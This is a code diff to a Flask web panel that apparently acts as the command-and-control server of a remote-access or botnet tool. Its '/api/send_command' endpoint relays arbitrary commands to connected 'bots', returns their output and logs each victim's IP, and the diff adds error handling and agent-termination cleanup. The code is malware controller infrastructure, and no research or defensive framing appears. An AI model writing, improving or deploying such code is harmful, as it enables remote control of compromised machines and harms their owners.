@@ -167,8 +167,11 @@ def upload_file():
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
     data = request.get_json()
-    session_id = int(data.get('session_id'))
-    command = data.get('command')
+    try:
+        session_id = int(data.get('session_id'))
+        command = data.get('command')
+    except (TypeError, ValueError):
+        return jsonify({'error': 'Invalid request data'}), 400
     
     if session_id not in Bot.botList:
         return jsonify({'error': 'Invalid session ID'}), 400
@@ -176,9 +179,13 @@ def send_command():
     bot = Bot.botList[session_id]
     try:
         if command == 'quit':
-            # For quit command, don't wait for response
             try:
-                bot.kill()  # This will handle cleanup even if send fails
+                # Just try to send quit and cleanup immediately
+                try:
+                    bot.reliable_send('quit')
+                except:
+                    pass
+                bot.cleanup()
                 logging.info(f"Agent {session_id} terminated")
                 return jsonify({
                     'success': True,
@@ -186,39 +193,57 @@ def send_command():
                 })
             except Exception as e:
                 logging.error(f"Error during termination of agent {session_id}: {e}")
-                # Ensure bot is removed even if kill fails
+                # Make sure it's removed from the list
                 if session_id in Bot.botList:
-                    Bot.botList[session_id].cleanup()
+                    try:
+                        Bot.botList[session_id].cleanup()
+                    except:
+                        if session_id in Bot.botList:
+                            del Bot.botList[session_id]
                 return jsonify({
                     'success': True,
                     'message': 'Agent forcefully terminated'
                 })
         
-        # For other commands...
-        bot.reliable_send(command)
-        response = bot.reliable_recv()
-        
-        if response is None:
-            # Connection lost, cleanup the bot
-            bot.cleanup()
-            raise Exception("No response from agent")
+        # For other commands
+        try:
+            bot.reliable_send(command)
+            response = bot.reliable_recv()
             
-        bot.update_last_seen()
-        logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
-        
-        return jsonify({
-            'success': True,
-            'output': response,
-            'timestamp': datetime.now().isoformat()
-        })
-        
+            if response is None:
+                bot.cleanup()
+                return jsonify({
+                    'error': 'Connection lost'
+                }), 500
+            
+            bot.update_last_seen()
+            logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
+            
+            return jsonify({
+                'success': True,
+                'output': response
+            })
+            
+        except Exception as e:
+            logging.error(f"Command execution error: {str(e)}")
+            # Clean up if connection is broken
+            if session_id in Bot.botList:
+                Bot.botList[session_id].cleanup()
+            return jsonify({
+                'error': f'Command execution failed: {str(e)}'
+            }), 500
+            
     except Exception as e:
-        logging.error(f"Error executing command on Session {session_id}: {e}")
-        # If there's an error, ensure bot is cleaned up
+        logging.error(f"Unexpected error in send_command: {str(e)}")
+        # Final cleanup attempt
         if session_id in Bot.botList:
-            Bot.botList[session_id].cleanup()
+            try:
+                Bot.botList[session_id].cleanup()
+            except:
+                if session_id in Bot.botList:
+                    del Bot.botList[session_id]
         return jsonify({
-            'error': f'Command execution failed: {str(e)}'
+            'error': f'Internal server error: {str(e)}'
         }), 500
 
 @app.route('/api/set_alias', methods=['POST'])
